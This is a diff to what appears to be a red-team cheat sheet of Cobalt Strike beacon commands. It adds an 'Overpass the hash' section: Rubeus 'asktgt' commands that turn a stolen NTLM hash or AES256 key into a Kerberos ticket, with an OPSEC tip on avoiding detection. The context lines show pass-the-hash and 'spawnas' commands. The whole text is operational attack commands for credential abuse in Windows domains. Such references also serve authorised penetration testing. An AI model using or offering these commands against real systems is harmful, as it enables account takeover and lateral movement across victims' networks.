@@ -162,3 +162,9 @@ spawnas <DOMAIN>\<USER> <PASSWORD> <BEACON>
 pth <DOMAIN>\<USER> <NTLM HASH>
 ```
 
+#### Overpass the hash
+- OPSEC: Use AES256 keys
+```
+execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /rc4:<NTLM HASH> /nowrap
+execute-assembly Rubeus.exe asktgt /user:<USER> /domain:<DOMAIN> /aes256:<AES256 HASH> /nowrap /opsec
+```
